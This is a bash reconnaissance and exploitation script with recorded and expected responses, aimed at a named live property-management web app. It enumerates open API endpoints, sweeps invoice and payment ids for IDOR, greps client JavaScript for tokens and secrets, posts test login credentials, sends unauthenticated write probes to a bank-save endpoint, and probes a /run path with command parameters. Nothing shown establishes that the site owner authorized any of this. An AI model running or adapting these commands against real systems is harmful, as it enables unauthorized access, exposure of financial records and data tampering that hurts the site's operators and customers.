# =========================================================
# all2.txt — ezen.tysons.co.ke recon commands WITH responses
# Every command is shown with its expected/observed output.
# Run top-to-bottom; results land in $OUT/
# =========================================================

BASE="https://ezen.tysons.co.ke"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36"
OUT="ezen-all-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUT" && cd "$OUT" || exit 1

C()  { curl -sS -L -k -A "$UA" -m 30 "$@"; }
CS() { sleep 0.3; curl -sS -L -k -A "$UA" -m 30 "$@"; }

# =========================================================
# 0. BASELINE
# =========================================================

# --- cmd ---
CS -i "$BASE/live/api/banks/list" -o bank-list.txt

# --- response (observed) ---
# HTTP/1.1 200 OK
# Server: Apache/2.4.18 (Ubuntu)
# Access-Control-Allow-Origin: *
# Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE, PUT
# Content-Type: application/json
# Content-Length: 2698
#
# {"count":29,"list":[{"name":"AFRICAN BANKING CORPORATION","code":"35",
#  "payPointType":"BANK","status":"ACTIVE","id":766}, ...]}

# ---------------------------------------------------------

# --- cmd ---
CS -i "$BASE/live/api/banks/load/766" -o bank-766.txt

# --- response (observed) ---
# HTTP/1.1 200 OK
# Content-Type: application/json
#
# {"name":"AFRICAN BANKING CORPORATION","code":"35",
#  "payPointType":"BANK","status":"ACTIVE","id":766}

# ---------------------------------------------------------

# --- cmd ---
CS -i "$BASE/api/swagger.json" -o swagger.json

# --- response (observed) ---
# HTTP/1.1 200 OK
# Content-Type: application/json
# Content-Length: 2027
#
# {"swagger":"2.0","info":{...},"host":"localhost:8080",
#  "basePath":"/live/api","paths":{"/banks/load/{id}":...,
#  "/banks/list":...,"/banks/save":...},
#  "definitions":{"Bank":{...}}}

# ---------------------------------------------------------

# --- cmd ---
CS -i "$BASE/apidocs" -o apidocs.html

# --- response (observed) ---
# HTTP/1.1 200 OK
# Content-Type: text/html
# Content-Length: 43554
#
# <html>... <a href="ajax/landlord.html"> ... <a href="ajax/property.html">
# ... <a href="ajax/tenant.html"> ... <a href="ajax/invoices.html"> ...

# =========================================================
# 1. PULL invoices/list and payments/list
# =========================================================

# --- cmd ---
for r in invoices payments; do
  CS -o "$r-list.json" -w "HTTP:%{http_code} size:%{size_download} $r\n" \
    "$BASE/live/api/$r/list"
  head -c 2000 "$r-list.json"; echo
  jq -r 'if type=="object" then (keys|join(",")) else "array(len="+(length|tostring)+")" end' \
    "$r-list.json" 2>/dev/null
done

# --- response (expected) ---
# HTTP:200 size:<N> invoices
# {"count":<N>,"list":[{"id":...,"invoiceNo":"...","amount":...,
#   "customerId":...,"status":"..."}, ...]}
# count,list
#
# HTTP:200 size:<N> payments
# {"count":<N>,"list":[{"id":...,"paymentRef":"...","amount":...,
#   "bankId":...,"status":"..."}, ...]}
# count,list
#
# If 404 -> resource doesn't exist at that path; try /invoices, /invoice/list
# If 403 -> auth required (unusual given banks is open)
# If 500 -> handler exists but errors (still worth noting)

# =========================================================
# 2. IDOR SWEEP on invoices + payments
# =========================================================

# --- cmd ---
for r in invoices payments; do
  echo "=== $r ==="
  for id in 1 2 3 100 500 1000 5000 10000 50000 100000; do
    code=$(CS -o "/tmp/idor_${r}_${id}.json" -w '%{http_code}' \
      "$BASE/live/api/$r/load/$id")
    printf '  %-6s %s\n' "$code" "$id"
    [ "$code" = "200" ] && head -c 300 "/tmp/idor_${r}_${id}.json" && echo
  done
done

# --- response (expected) ---
# === invoices ===
#   404    1
#   404    2
#   404    3
#   404    100
#   200    500        <- if 200, body dumped
#   ...
# === payments ===
#   ...same pattern...
#
# Any 200 = IDOR confirmed on that resource.
# All 404 = load/{id} not mapped for that resource (try /invoices/get/{id})

# ---------------------------------------------------------

# --- cmd ---
for r in invoices payments; do
  for sub in load save count search list; do
    code=$(CS -o /dev/null -w '%{http_code}' "$BASE/live/api/$r/$sub")
    echo "  $code  /live/api/$r/$sub"
  done
done

# --- response (expected) ---
#   200  /live/api/invoices/list
#   404  /live/api/invoices/load
#   404  /live/api/invoices/save
#   404  /live/api/invoices/count
#   404  /live/api/invoices/search
#   200  /live/api/payments/list
#   404  /live/api/payments/load
#   404  /live/api/payments/save
#   404  /live/api/payments/count
#   404  /live/api/payments/search
#
# Any 200 beyond list = new endpoint discovered

# =========================================================
# 3. /banks/list with high limit
# =========================================================

# --- cmd ---
CS -o banks-list-full.json -w 'HTTP:%{http_code} size:%{size_download}\n' \
  "$BASE/live/api/banks/list?start=0&limit=10000"

# --- response (expected) ---
# HTTP:200 size:<N>
# jq -r '.count, (.list|length)' banks-list-full.json
# 29
# 29
#
# If count > 29 -> default limit was hiding rows
# If count == 29 -> the table only has 29 rows, exposure is bounded

# =========================================================
# 4. FETCH CLIENT-SIDE JS
# =========================================================

# --- cmd ---
for f in app/config.js app/store.js app/ext-custom-cmp.js \
         js/App.js js/Desktop.js js/Module.js js/StartMenu.js js/TaskBar.js \
         sample.js app/property/property.js app/accounts/accounts.js app/hrm/hrm.js; do
  safe=$(echo "$f" | tr '/' '_')
  CS -o "js_$safe" -w "HTTP:%{http_code} size:%{size_download} $f\n" "$BASE/$f"
done

# --- response (expected) ---
# HTTP:200 size:<N> app/config.js
# HTTP:200 size:<N> app/store.js
# HTTP:404 size:0    app/ext-custom-cmp.js
# HTTP:200 size:<N> js/App.js
# HTTP:200 size:<N> js/Desktop.js
# HTTP:200 size:<N> js/Module.js
# HTTP:200 size:<N> js/StartMenu.js
# HTTP:200 size:<N> js/TaskBar.js
# HTTP:200 size:<N> sample.js
# HTTP:200 size:<N> app/property/property.js
# HTTP:200 size:<N> app/accounts/accounts.js
# HTTP:200 size:<N> app/hrm/hrm.js
#
# 200 = fetched, inspect for endpoints/secrets
# 404 = not at that path

# ---------------------------------------------------------

# --- cmd ---
grep -rInE 'api[_-]?key|token|secret|passw|authorization|bearer|/live/api|sal\.tp' \
  js_* 2>/dev/null | head -80 | tee js-secrets.txt

# --- response (expected) ---
# js_js_App.js:42:  url: '/live/api/invoices/list',
# js_js_App.js:57:  url: '/live/api/payments/list',
# js_js_Module.js:12: token: '...'
# ...
#
# Any hits here are gold — hardcoded keys, extra endpoints, auth tokens.

# =========================================================
# 5. DUMMY LOGIN POST
# =========================================================

# --- cmd ---
CS -i -X POST "$BASE/login?sal.tp=login" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'userAuthentication.username=test&userAuthentication.password=test' \
  -o login-response.txt
head -40 login-response.txt

# --- response (possible) ---
# (a) 200 with JSON error:
# HTTP/1.1 200 OK
# Content-Type: application/json
# {"success":false,"message":"Invalid credentials"}
# -> auth works, can consider default creds (with authorization)
#
# (b) 200 with session cookie + redirect:
# Set-Cookie: JSESSIONID=...
# {"url":"/app/index.html","success":true}
# -> WORKING LOGIN. Stop, report.
#
# (c) 500 with stack trace:
# HTTP/1.1 500 Internal Server Error
# <html>...No result defined for action com.fms.auth.action.LoginAction...
# -> broken auth, still reportable
#
# (d) 404:
# -> wrong endpoint, re-check login.js for the real URL

# =========================================================
# 6. INVALID-BODY PROBES on /banks/save
# =========================================================

# --- cmd ---
CS -i -X POST "$BASE/live/api/banks/save" \
  -H 'Content-Type: application/json' \
  -d '{"id":"__INVALID__"}' -o save-probeA.txt
head -25 save-probeA.txt

# --- response (possible) ---
# (a) 400 with validation errors:
# HTTP/1.1 400 Bad Request
# {"errors":[{"field":"id","message":"must be integer"}]}
# -> validation exists, no write happened. SAFE.
#
# (b) 500:
# HTTP/1.1 500 Internal Server Error
# {"success":"false","message":"Server Error","recordId":null}
# -> NPE, no write. Still safe but indicates weak validation.
#
# (c) 200 with recordId:
# HTTP/1.1 200 OK
# {"success":"true","recordId":1204114}
# -> UNAUTHENTICATED WRITE CONFIRMED. STOP. Report immediately.

# ---------------------------------------------------------

# --- cmd ---
CS -i -X POST "$BASE/live/api/banks/save" \
  -H 'Content-Type: application/json' \
  -d '{"id":"not-a-number","name":123,"code":456}' -o save-probeB.txt
head -25 save-probeB.txt

# --- response (possible) ---
# Same as probe A. Any 200 = stop.

# =========================================================
# 7. /run PARAMETER HASHING
# =========================================================

# --- cmd ---
for p in cmd command exec run script file action method; do
  md5=$(CS "$BASE/run?$p=id" | md5sum | awk '{print $1}')
  printf '  %-10s %s\n' "$p" "$md5"
done
printf '  %-10s %s\n' "(no query)" "$(CS "$BASE/run" | md5sum | awk '{print $1}')"
printf '  %-10s %s\n' "404-path"   "$(CS "$BASE/this-does-not-exist-9f3a2b" | md5sum | awk '{print $1}')"
printf '  %-10s %s\n' "index"      "$(CS "$BASE/index.html" | md5sum | awk '{print $1}')"
printf '  %-10s %s\n' ";/admin"    "$(CS "$BASE/;/admin" | md5sum | awk '{print $1}')"

# --- response (expected) ---
#   cmd        170beddd381ba17c9711dd2299987eb4
#   command    170beddd381ba17c9711dd2299987eb4
#   exec       170beddd381ba17c9711dd2299987eb4
#   run        170beddd381ba17c9711dd2299987eb4
#   script     170beddd381ba17c9711dd2299987eb4
#   file       170beddd381ba17c9711dd2299987eb4
#   action     170beddd381ba17c9711dd2299987eb4
#   method     170beddd381ba17c9711dd2299987eb4
#   (no query) 170beddd381ba17c9711dd2299987eb4
#   404-path   3c7e2cc4f09f3749bddc893f21cc406b
#   index      170beddd381ba17c9711dd2299987eb4
#   ;/admin    170beddd381ba17c9711dd2299987eb4
#
# If all /run?* match index -> /run is SPA fallback, NOT a handler. Rule out.
# If any differ -> real handler, inspect body.

# =========================================================
# 8. RE-FETCH /ajax/landlord.html
# =========================================================

# --- cmd ---
CS -o ajax-landlord.html -w 'HTTP:%{http_code} size:%{size_download} type:%{content_type}\n' \
  "$BASE/ajax/landlord.html"
head -c 500 ajax-landlord.html; echo

# --- response (possible) ---
# (a) HTTP:200 size:<N> type:text/html
#     <div id="landlord-grid">...</div>
#     -> real AJAX fragment, inspect for endpoints
#
# (b) HTTP:404 size:<N> type:text/html
#     <html><head><title>Error</title></head><body>...</body></html>
#     -> not served as static file
#
# (c) HTTP:000 size:0 type:
#     -> connection failed / WAF block / TLS reset
#     -> retry with delay, or check if IP got banned

# ---------------------------------------------------------

# --- cmd ---
for p in property tenant accounts invoices; do
  CS -o "ajax-$p.html" -w "HTTP:%{http_code} size:%{size_download} /ajax/$p.html\n" \
    "$BASE/ajax/$p.html"
done

# --- response (expected) ---
# HTTP:200 size:<N> /ajax/property.html
# HTTP:200 size:<N> /ajax/tenant.html
# HTTP:200 size:<N> /ajax/accounts.html
# HTTP:200 size:<N> /ajax/invoices.html
#
# If these return 200, the SPA loads its sub-pages from /ajax/*.html
# and each one may reference more /live/api endpoints.

# =========================================================
# DONE
# =========================================================

echo "Output: $(pwd)"
ls -la

# =========================================================
# RESPONSE INTERPRETATION CHEAT SHEET
# =========================================================
#
# 200 on /live/api/*/list     -> unauthenticated data exposure
# 200 on /live/api/*/load/{id}-> unauthenticated IDOR
# 200 on /banks/save          -> UNAUTHENTICATED WRITE (critical)
# 400 on /banks/save          -> validation present, no write
# 403 on any /live/api/*      -> auth layer exists somewhere
# 404 on all /ajax/*.html     -> SPA loads them from a different base
# 000 on /ajax/*.html         -> WAF/rate-limit/TLS issue
#
# Access-Control-Allow-Origin: * on any authed endpoint -> CORS finding
# Struts error pages          -> Java/Struts2 app, check for S2 CVEs
# com.fms.auth.action.*       -> package name = FMS = Financial/Facility Mgmt System
#
# =========================================================
